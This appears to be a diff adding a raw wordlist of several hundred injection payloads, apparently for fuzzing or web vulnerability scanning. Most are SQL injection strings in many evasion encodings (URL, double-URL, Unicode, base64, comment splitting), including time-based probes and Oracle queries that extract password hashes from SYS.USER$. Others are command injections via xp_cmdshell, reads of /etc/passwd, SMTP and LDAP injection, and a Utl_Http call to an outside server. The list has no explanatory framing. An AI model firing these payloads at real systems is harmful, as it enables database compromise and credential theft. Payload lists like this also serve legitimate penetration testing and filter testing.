@@ -1,0 +1,668 @@
+'   AND  1=utl_inaddr.get_host_address(( SELECT      DISTINCT(table_name)  FROM   ( SELECT      DISTINCT(table_name), ROWNUM   AS     LIMIT     FROM   sys.all_tables)   WHERE       LIMIT   =2))   AND  'i'='i
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20---- sp_password
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i-- sp_password
+hi' Or 'a'='a
+' or 4 > 7 and '0having'='0having'
+',NULL%23ToQTSQ%0A,NULL%23bMFFsaRu%0A,NULL%23MYqRJf%0A,NULL%23wCEpNf%0A,NULL%23NInkFlXjNAmT%0A)%20waitfor%20delay%20'0:0:20'%20/*
+'+iF(benchmark(3000000,MD5(1)),nUll,nUll),nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll,nUll)%20--
+Jy8qKi9vci8qKi8nJ3F3ZXInJy8qKi89LyoqLycncXdlcicn
+'/**/or/**/1/**/=/**/1%00
+%u005C%u0078%u0032%u0037%u0055%u004E%u0049%u004F%u004E%u0020%u0053%u0045%u004C%u0045%u0043%u0054
+' or 'text' > 't' and '0having'='0having'
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM%23WWpcPqSO%0A:+<youremail>%0aRCPT+TO%23dWROwWLGM%0A:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+or 'W'='W' #"
+") waitfor delay '0:0:20' /*-- sp_password
+'%0Cor%011=1%05or%0F'1'='1
+) o/**/r (a=a
+%bf%27),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+'%23MovnXVnOAxAP%0AAND%23ADnrEfspAVF%0A1=utl_inaddr.get_host_address((SELECT%23HwvVKrHYUYe%0ADISTINCT(USERNAME)%23mnRbRAJOKj%0AFROM%23BZSlRId%0A(SELECT%23uVsGfJmS%0ADISTINCT(USERNAME),%23mSkGAsbcYvL%0AROWNUM%23eucEWiUK%0AAS%23ZTcmjrxJoGz%0ALIMIT%23VDjBDfSg%0AFROM%23vctAsC%0ASYS.ALL_USERS)%23gRqOwhEwtrdx%0AWHERE%23EWeNExC%0ALIMIT=1))%23vlCuxytHBhy%0AAND%23sQPaWTz%0A'i'='i
+%257C%256E%2569%2564%255C%256E
+cat /etc/passwd
+")/*!or*/1=1/*!or*/("1"="1
+'  or    ''qwer''/*
+' AND 1=utl_inaddr.get_host_address((SELESELECTCT DISTINCT(granted_role) FFROMROM (SELESELECTCT DISTINCT(granted_role), ROWNUM AS LIMIT FFROMROM dba_role_privs WHWHEREERE GRANTEE=SYS.LOGINUSER) WHWHEREERE LIMIT=3)) AND 'i'='i
+'--%0Aor--%0A'''qwer'''='''qwer'''--
+rep/**/l/**/ace
+and--%0A0=benchmark(3000000,MD5(1))%20%23
+'%09AND%091=utl_inaddr.get_host_address((SELECT%0ADISTINCT(PASSWORD)%09FROM%0A(SELECT%0DDISTINCT(PASSWORD),%0DROWNUM%0DAS%0CLIMIT%0DFROM%0CSYS.USER$)%0AWHERE%0CLIMIT=5))%0CAND%0A'i'='i
+`ping%23%0A127.0.0.1`
+'--uGxigYyaN%0Agroup--aymbvYBK%0Aby--RvyWHKBqnIDn%0Auserid--fFhuDmbsIYbn%0Ahaving--BTfaTyVDepxE%0A1=1--
+' union select 1,load_file('/etc/passwd'),1,1,1;%00
+%e%x%e%c %m%a%s%t%e%r%.%.%x%p%_%c%m%d%s%h%e%l%l %'%n%e%t%+%v%i%e%w%'
+a'+waitfor+delay+'0:0:10'--
+")) or 1=1 or (("1"="1 and '0having'='0having'
+'/**//*!or*//**/1/**/=/**/1
+'%23IVvkLHI%0Aor%23SZpiNgWyHpzT%0A%23SQtOgMoKcTLM%0A''qwer''=''qwer''--
+')) /*!00000waitfor delay '0:0:20' *//*
+| /*!00000ping -n 30 127.0.0.1 |*/
+%'%) %o%r %s%l%e%e%p%(%_%_%T%I%M%E%_%_%)%=%'
++if(benchmark(3000000,MD5(1)),null,null),null,null,null,null,null,null,null,null,null)%20--
+select--VdDrUxGPR%0Acurrent_setting('config_file');
+%EF%BC%87 or uname like %EF%BC%87%
+%2522%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252F%252A
+' or '7659' LIKE '7659
+'--eSIBysxxbPY%0Aor--RScsocS%0A1=1--
+x' anD members.email iS nUlL; --
+declare @q nvarchar (200)   select  @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000    exec(@q)
+declare /*!00000@q nvarchar (4000) select @q =*/
+(select/**/count(*)/**/from/**/all_users/**/t1,all_users/**/t2,all_users/**/t3,all_users/**/t4,all_users/**/t5)
+' union all select @@version---- sp_password
+'%0Dor%0A'W'='W'%0A--
+hi' or 'a'='a
+' /*!30579or user like '%*/
+<username>'%0DOR%0A1=1--
+%2522%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252F%252A
+"),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20/*
+JyBvciAnNzY1OSc9Jzc2NTk=
+%+%i%f%(%b%e%n%c%h%m%a%r%k%(%3%0%0%0%0%0%0%,%M%D%5%(%1%)%)%,%N%U%L%L%,%N%U%L%L%)%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%)%20%-%-
+',nulL,nulL,nulL,nulL,nulL,nulL)%20waitfor%20delay%20'0:0:20'%20/*
+y%23XyOkDgo%0Aor%23kdbceSrID%0A1=1%23oVRjSBKo%0A--
+%u0027%u0020%u0041%u004E%u0044%u0020%u0031%u003D%u0075%u0074%u006C%u005F%u0069%u006E%u0061%u0064%u0064%u0072%u002E%u0067%u0065%u0074%u005F%u0068%u006F%u0073%u0074%u005F%u0061%u0064%u0064%u0072%u0065%u0073%u0073%u0028%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0044%u0049%u0053%u0054%u0049%u004E%u0043%u0054%u0028%u0055%u0053%u0045%u0052%u004E%u0041%u004D%u0045%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0044%u0049%u0053%u0054%u0049%u004E%u0043%u0054%u0028%u0055%u0053%u0045%u0052%u004E%u0041%u004D%u0045%u0029%u002C%u0020%u0052%u004F%u0057%u004E%u0055%u004D%u0020%u0041%u0053%u0020%u004C%u0049%u004D%u0049%u0054%u0020%u0046%u0052%u004F%u004D%u0020%u0053%u0059%u0053%u002E%u0041%u004C%u004C%u005F%u0055%u0053%u0045%u0052%u0053%u0029%u0020%u0057%u0048%u0045%u0052%u0045%u0020%u004C%u0049%u004D%u0049%u0054%u003D%u0038%u0029%u0029%u0020%u0041%u004E%u0044%u0020%u0027%u0069%u0027%u003D%u0027%u0069
+%2B%69%66%28%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%2D%2D
+) waitfor delay %bf%270:0:20' --
+a);/usr/bin/id;%00
+IiBvciBiZW5jaG1hcmsoMTAwMDAwMDAsTUQ1KDEpKSM=
+%2527%2520%256F%2572%2520%2531%252F%252A
+dEcLarE @s VArchAR(200) sELect @s = 0x77616974666F722064656C61792027303A303A31302700 EXec(@s)
+SEleCT * FrOM sysusers
+"))))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A/*
+)))%09and%0A0=benchmark(3000000,MD5(1))%20--
+exec--%0Amaster..xp_cmdshell--%0A'ping+<attackerip>'
+' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), ROWNUM as limit from all_tab_columns) where limit=7)) and 'i'='i
+' or 'something' like 'some%'
+%bf%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1))--
+%79%20%27%20%6F%72%20%31%30%20%3E%20%39
+%u0022%u0029%u0029%u0029%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0030%u0027%u0020%u002F%u002A
+' /*!30790or '1'='1'*/--
+"),null,null,null)%20waitfor%20delay%20'0:0:20'%20--
+';/*!exec*/master..xp_cmdshell 'ping 10.10.1.2'--
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i%00
+&%0Cping%06-i%0630%0E127.0.0.1%03&
+%' %o%r %1%0 %> %9
+",null,null,null,null,null,null)%20waitfor%20delay%20'0:0:20'%20/*
+or/**/isNULL(1/0)/**//*
+")/**/or/**/1=1/**/or/**/("1"="1
+select version();%00
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+%2527%2529%2529%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252D%252D
+%31%20%61%6E%64%20%73%75%62%73%74%72%69%6E%67%28%76%65%72%73%69%6F%6E%28%29%2C%31%2C%31%29%3D%35
+%73%65%6C%65%63%74%20%2A%20%66%72%6F%6D%20%6D%61%73%74%65%72%2E%2E%73%79%73%73%65%72%76%65%72%73%65
+hi%0Bor%0A1=1%09--"
+%bf%27,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*
+(SeLEcT(0)fRom(SeLEcT(sleep(0)))v)/*'+(SeLEcT(0)fRom(SeLEcT(sleep(12)))v)+'"+(SeLEcT(0)fRom(SeLEcT(sleep(0)))v)+"*/
+"))))))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A/*
+1))%09or%0Dpg_sleep(__TIME__)--
+' or 4479=4479
+procedure%00
+' Union (selecT NUlL, NUlL, (selecT @@VErSiOn)) --
+declare+@q+nvarchar+(4000)+select+@q+=
+%y %o%r %1%=%1 %-%-
+')))%23PprXVNLWD%0Awaitfor%23jaFQpiVpvyj%0Adelay%23dvlHukwzt%0A'0:0:20'%23ObgLfKpctjWk%0A/*
+%bf%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3))--
+' UNIOUNIONN SELECSELECTT all 1,2,x,x,x,x 〞
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(table_name)/*!FROM*/(/*!SELECT*/DISTINCT(table_name), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/sys.all_tables)/*!WHERE*//*!LIMIT*/=4))/*!AND*/'i'='i
+(select%23ylsgDIxZckAv%0A%23frjDDt%0Acount(*)%23jisOmlal%0Afrom%23sUlZLFycXi%0A%23npEbpOSG%0Aall_users%23uTugTclMBAox%0At1,all_users%23LfHfLvqTAlyT%0At2,all_users%23xHufOVkv%0At3,all_users%23vRNGegQzG%0At4,all_users%23rQlmANfwul%0At5)
+",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23%00
+%s%e%l%e%c%t %n%a%m%e%, %t%b%n%a%m%e%, %c%o%l%t%y%p%e %f%r%o%m %s%y%s%i%b%m%.%s%y%s%c%o%l%u%m%n%s%;
+%27%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+(sele/**/ct coun/**/t(*) f/**/r/**/om dom/**/a/**/in.dom/**/a/**/ins a/**/s t1,dom/**/a/**/in.columns a/**/s t2,dom/**/a/**/in.tables a/**/s t3)
+%256F%2572%2520%2530%253D%2530%2520%2523%2522
+JyBvciAxLyo=
+';%23XgvPTofUtd%0Aif%23RVnZyX%0Anot(select%23zUilLNzyLEY%0Asystem_user)%23rYKPTTDZP%0A<>%23jCoSOyOd%0A'sa'%23qVBGGStZyzkt%0Awaitfor%23QfyoUIS%0Adelay%23KJlTuvY%0A'0:0:2'%23bYezoBRtS%0A--
+9999"||(select%0F99999999%06from%02pg_sleep(15))||"9999
+' or '1'='1'--%00
+a' /*!00000or 'a' = 'a*/
+%00%27 or 1/*
+%2527%2520%256F%2572%2520%2534%2534%2537%2539%253D%2534%2534%2537%2539%2520%2523
+y'%23%0AOR%23%0Afull_name%23%0ALIKE%23%0A'%Bob%
+1%C0%AAand%C0%AA1%C0%BF1
+Jykgb3IgKCdhJz0nYQ==
+%28%73%71%6C%76%75%6C%6E%29
+JyB1bmlvbiBzZWxlY3Q=
+y%C0%AF%C0%AAAND%C0%AA1%C0%BF%C0%AASELECT%C0%AACOUNT%C0%AA%C0%AA%C0%AB%C0%AAFROM%C0%AAtabname%C0%AB%C0%BB%C0%AA%C0%AF%C0%AF
+%h%a%n%d%l%e%r
+'%07union%08(select%0FNULL,%01(select%08@@version))%01--
+\x27UNION%23%0ASELECT
+1 /*!00000exec sp_ (or exec xp_)*/
+'/**/or/**/4479/**/=/**/4479 and '0having'='0having'
+9999"||(select%08count(*)%07from%09INFORMATION_SCHEMA.tables%0Aas%0Csys1,INFORMATION_SCHEMA.tables%05as%09sys2,INFORMATION_SCHEMA.tables%07as%01sys3,INFORMATION_SCHEMA.tables%05as%0Esys4,INFORMATION_SCHEMA.tables%0Eas%03sys5,INFORMATION_SCHEMA.tables%02as%08sys6)||"9999
+(select%23bEpkhszVgf%0Acount(*)%23VxwOBH%0Afrom%23OACmkid%0Asysusers%23hjmqfh%0Aas%23vWwcsYHBrfBO%0Asys1,sysusers%23JtoRKLlDhtSy%0Aas%23VHLZhtaMhf%0Asys2,sysusers%23HQNzAT%0Aas%23xWOpJQqH%0Asys3,sysusers%23jIgYPhQjVTkU%0Aas%23pQwaYbA%0Asys4,sysusers%23deXycOu%0Aas%23TMquTOMByuL%0Asys5,sysusers%23IQxoEbrp%0Aas%23BQwSqbkABO%0Asys6,sysusers%23aiGqKkfKrbJj%0Aas%23SdPGHQJyNJ%0Asys7)%23KHJuDRWjFAg%0Aas%23BuuwuhCsWf%0Atest
+%C0%AF%C0%AB%C0%AAor%C0%AA1%C0%BF1%C0%AAor%C0%AA%C0%AA%C0%AF1%C0%AF%C0%BF%C0%AF1
+exec%07master..xp_cmdshell%06'ipconfig+/all'
+"%23VTTlwXZ%0Awaitfor%23KShSnzfBAR%0Adelay%23qsCHfICpp%0A'0:0:20'%23gYOlXFk%0A/*
+)%23%0Aand%23%0A0=benchmark(3000000,MD5(1))%20%23
+%252C%2528%2573%2565%256C%2565%2563%2574%2520%2569%2566%2528%2563%256F%2575%256E%2574%2528%252A%2529%2521%253D%252D%2531%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%2529%2529%252D%252D
+copy myfile FRFROMOM '/etc/passwd';
+'),/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL)%20waitfor%20delay%20'0:0:20'%20--
+or/**/0=0/**/#
+y' /*!30687AND userid IS NULL; */--
+' /*!30252or '4479'='4479*/
+" or 4479 LIKE 4479 --
+'%23OjpqNJaYuxO%0AAND%23FohEQhyC%0A%23pprXwBDGnRdC%0A1=utl_inaddr.get_host_address((SELECT%23ajhaZSay%0A%23yXjNMQ%0ADISTINCT%23LLpvPtc%0A(USERNAME)%23nqPKWPHo%0AFROM%23MvQPzkwx%0A%23yTdWCLiB%0A(SELECT%23DRhJWUCo%0A%23MtTrziBNWjjE%0ADISTINCT%23uZhwepHjjYV%0A(USERNAME),%23udjtss%0AROWNUM%23gfGkXKhLClJx%0AAS%23ZuHuwBLI%0A%23vtgRgOXAGagN%0ALIMIT%23coPYBhk%0A%23AQKDNA%0AFROM%23tUtgWkD%0A%23HEkXnVEK%0ASYS.ALL_USERS)%23RJihAeXh%0AWHERE%23latqhMLHhJ%0A%23RTbKGgwU%0ALIMIT%23HOgGeoHbYb%0A=8))%23zRiGRvkSD%0AAND%23VQZhgBroe%0A%23zPYNYwv%0A'i'='i
+a'%23%0Awaitfor%23%0Adelay%23%0A'0:0:10'--
+hi')--qQctkzA%0Aor--NoiiEnlWX%0A('a'='a
+'))))--fHTSWp%0Awaitfor--noclNnZqT%0Adelay--tUbWRA%0A'0:0:20'--nUHuxpTOBfQN%0A--
+9999"%07or%02benchmark(15000000,md5(0x4e446b6e))%08or%01"0"="9999
+",/*!0NULL,/*!0NULL)%20waitfor%20delay%20'0:0:20'%20/*
+JytpZihiZW5jaG1hcmsoMzAwMDAwMCxNRDUoMSkpLE5VTEwsTlVMTCksTlVMTCxOVUxMLE5VTEwsTlVMTCxOVUxMLE5VTEwsTlVMTCklMjAvKg==
+select%0Auser%0Afrom%09sysibm.sysdummy1;
+'hi'%23KVMnWIMtuV%0Aor%23irASXnqdwc%0A%23gCxkEhKuxkvc%0A'x'='x';
+%EF%BC%87,(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+",(s/**/e/**/l/**/e/**/ct%20if(cou/**/nt(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+(select%0Bcount(*)%0Dfrom%0Brdb$fields%0Bas%0Dt1,rdb$types%0Aas%09t2,rdb$collations%0Bas%0Ct3)
++i/**/f(benchmark(3000000,MD5(1)),NU/**/LL,NU/**/LL),NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL)%20%23
+%u0027%u002B%u0073%u0071%u006C%u0076%u0075%u006C%u006E
+hi')%0Aor%0D('a'='a
+'--%0Aunion+select+banner,null,null,null,null+from+v$version每
+(substring(version(),1,1)=5)-- sp_password
+'; e/**/xecute i/**/m/**/me/**/di/**/ate 'sel' || 'ect us' || 'er'
+")))))) waitfor delay '0:0:20' -- and '0having'='0having'
+select%0Csystem_user%0Dfrom%07sysibm.sysdummy1;
+'%0AAND%091=utl_inaddr.get_host_address((SELECT%0BDISTINCT(table_name)%0AFROM%09(SELECT%0ADISTINCT(table_name),%0CROWNUM%09AS%0ALIMIT%0AFROM%0Asys.all_tables)%0AWHERE%0CLIMIT=5))%0DAND%0C'i'='i
+'%23NWzYlfRGw%0Aunion+select+global_name,null,null,null,null+from+global_name每
+J3NxbGF0dGVtcHQx
+%u0078%u0027%u0020%u0041%u004E%u0044%u0020%u0031%u003D%u0028%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0043%u004F%u0055%u004E%u0054%u0028%u002A%u0029%u0020%u0046%u0052%u004F%u004D%u0020%u0074%u0061%u0062%u006E%u0061%u006D%u0065%u0029%u003B%u0020%u002D%u002D
+'),NULL%23SLiPkxrHc%0A,NULL%23IMprYj%0A,NULL%23eTuZYGDMfTr%0A,NULL%23ypsxqow%0A)%20waitfor%20delay%20'0:0:20'%20--
+")))) a/**/nd 0=benchmark(3000000,MD5(1))%20/*
+),NULL%09,NULL%09)%20waitfor%20delay%20'0:0:20'%20/*
+1) o/**/r pg_sleep(__TIME__)--
+o/**/r 1=1 o/**/r ""=
+'),/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL)%20waitfor%20delay%20'0:0:20'%20--
+%EF%BC%87)) or benchmark(10000000,MD5(1))#
+%27%20%6F%72%20%31%3D%31%20%2D%2D
+a' or 'a' = 'a-- sp_password
+%u0027%u002B%u0069%u0066%u0028%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u0020%u002F%u002A
+waitfor+delay+'0:0:20'+--
+"+if%23wJOKYKkeaH%0A(benchmark(3000000,MD5(1)),NULL%23aMcjTRq%0A,NULL%23kwfHWaYtPVS%0A),NULL%23RwCDqZX%0A,NULL%23xCJUjeX%0A,NULL%23YgGWMs%0A,NULL%23qcbMDBGJcn%0A,NULL%23knZdpyQAi%0A,NULL%23XVFOFadmc%0A,NULL%23rkyeLyLv%0A)%20--
+;id\n
+9999'||(select /*!30601count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'9999*/
+\';%23%0Adesc%23%0Ausers;%23%0A--
+JytpZihiZW5jaG1hcmsoMzAwMDAwMCxNRDUoMSkpLE5VTEwsTlVMTCksTlVMTCxOVUxMKSUyMC8q
+select system_user/*!0from sysibm.sysdummy1;
+declare%23bgkSJxCfl%0A@s%23RnSemNgbGAo%0Avarchar%23OzQLKat%0A%23YFSoHy%0A(200)%23xmpbYNYS%0Aselect%23OgXJHzjRzM%0A%23HzTrJozJ%0A@s%23LbdWDboV%0A=%23RSVdPONWD%0A0x73656c65637420404076657273696f6e%23AsEMGkbP%0Aexec%23PMSHZySsm%0A(@s)
++if(benchmark(3000000,MD5(1)),NULL%09,NULL%09),NULL%09,NULL%09,NULL%09,NULL%09,NULL%09,NULL%09)%20%23
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--%00
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*//*!DISTINCT*/(column_name)/*!FROM*/(/*!SELECT*//*!DISTINCT*/(column_name), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/all_tab_columns)/*!WHERE*//*!LIMIT*/=6))/*!AND*/'i'='i
+%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%0%' %-%-
+' /*!30355AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i*/
+")))) ANd 0=benchmark(3000000,MD5(1))%20--
+or%23%0A0=0%23%0A#
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* and '0having'='0having'
+'%23UawXNR%0Aand%23AoIhgVeZucWz%0A1=(%23QodMEwN%0Aif((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+and 0=benchmark(3000000,MD5(1))%20/*-- sp_password
+copy%23BHkxCcyFcyjh%0Amyfile%23vAQFExiGw%0Afrom%23NhxVaFyVAf%0A%23dlYwbUvDH%0A'/etc/passwd';
+';--%0Aexec--%0Amaster..xp_cmdshell
+(SSELECTELECT count(*) FROFROMM rdb$fields as t1,rdb$types as t2,rdb$collations as t3)
+%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252F%252A
+%bf%27 AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8))--
+)) /*!00000and 0=benchmark(3000000,MD5(1))%20*/--
+x'%23zhfSRtjH%0AOR%23IzfAzolLLIBm%0Afull_name%23gIEgdYn%0ALIKE%23EZKSVAsLrcoF%0A'%Bob%
+,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+'),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20/*
+xsstest
+yor%0B3=3%0D--
+%bf%27 and 0=benchmark(3000000,MD5(1))%20--
+| /*!30707ping -i 30 127.0.0.1 |*/
+"))%23%0Aand%23%0A0=benchmark(3000000,MD5(1))%20/*
+'%23RzSnWuZJXTPc%0A(select%23EEWXdtJYqDM%0Atop%23IMOTFJ%0A1
+';/*!if*/is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --
+(select%23SCEILuwWsU%0A%23sIaIpFdKidn%0Acount(*)%23HFtohmOjtyL%0Afrom%23tIwYncVdRbx%0A%23WJinRGWPCKrQ%0AINFORMATION_SCHEMA.tables%23YKXUkGFSwXQ%0Aas%23dPunYgXW%0A%23vnFKKksGf%0Asys1,INFORMATION_SCHEMA.tables%23pQWBfLLoQ%0Aas%23JNzQCUnIWd%0A%23NdTbJKGSc%0Asys2,INFORMATION_SCHEMA.tables%23rixCBzhC%0Aas%23wuFbDbnCG%0A%23ZXWzFFl%0Asys3,INFORMATION_SCHEMA.tables%23nfXZADZZk%0Aas%23OhiEqTed%0A%23BtkGNeDT%0Asys4,INFORMATION_SCHEMA.tables%23oiHuniqHduc%0Aas%23hAaYwxjQzZ%0A%23vDGGUDN%0Asys5,INFORMATION_SCHEMA.tables%23StmQEHZBy%0Aas%23hYFgFhuIv%0A%23iRdZJqqYbJ%0Asys6)%23kHGRIbDxf%0Aas%23qQPTGhRCqP%0A%23GDBAPrZfghO%0Atest
+select%C0%AAcurrent%C0%DFsetting%C0%AA%C0%AFconfig%C0%DFfile%C0%AF%C0%AB%C0%BB
+')))))) /*!00000waitfor delay '0:0:20' */--
+%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A
+y' Or full_name liKE '%Bob%
+y ' or 10 NOT BETWEEN 0 AND 9
+' AND 1=utl_inaddr.get_host_address((SSELECTELECT host_name FROFROMM v$instance)) AND 'i'='i
+%2A%28%7C%28mail%3D%2A%29%29
+),/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL)%20waitfor%20delay%20'0:0:20'%20--
+'),N/**/U/**/LL,N/**/U/**/LL)%20waitfor%20delay%20'0:0:20'%20/*
+23%23FhTOWjAaEt%0AOR%23jeJAySefOZv%0A%23afOoQfd%0A1=1
+KSkpKSkgd2FpdGZvciBkZWxheSAnMDowOjIwJyAtLQ==
+select+*+from+syscat.dbauth+where+grantee+=+current+user;
+'||Utl_Http.request('http://<yourservername>')--%0Afrom--%0Adual--
+y '    or   2 > 1
+%u0026%u0061%u0070%u006F%u0073%u003B%u0020%u004F%u0052
+"))))--UylrVAwqs%0Awaitfor--LdBgwMO%0Adelay--gmHTgGSSGAf%0A'0:0:20'--muZDGmX%0A/*
+'%23MjrXNbtu%0Aunion%23CezaeOdC%0A(select%23oQMTunIxtrI%0ANULL,%23WlwcNnuHiL%0A(select%23YGaPubx%0A@@version))%23zahuIoe%0A--
+) /*!30602or (a=a*/
+or /*!307724479=4479 */--
+eCcgb3IgbmFtZSgpPSd1c2VybmFtZScgb3IgJ3gnPSd5
+JCt8K0RpcitjOlw=
+declare /*!30307@q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)*/
+'%0CUNION%0CSELECT
+ping+127.0.0.1
+%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
++  if(benchmark(3000000,MD5(1)),  NULL   ,  NULL   ),  NULL   ,  NULL   ,  NULL   ,  NULL   ,  NULL   ,  NULL   ,  NULL   ,  NULL   ,  NULL   )%20/*
+%0aDATA%0afoo%0a%2e%0aMAIL+fROM:+<youremail>%0aRCPT+To:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+'+if(benchmark(3000000,MD5(1)),null,null),null,null,null,null,null)%20/*
+SESELECTLECT current_setting('hba_file');
+1'%23NUrAILJyz%0Aand%23FOWuZyDk%0A%23DHFOZPiVcN%0A1=(select%23DZGlvOlD%0A%23SgQayffN%0Acount(*)%23LHRCrL%0Afrom%23tInMwta%0A%23nORVPCFTp%0Atablenames);%23bAxOgrW%0A--
+%00%27--
+%2531%253B%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2533%2530%253A%2530%2527%252D%252D
+%00%27 or 3=3 --
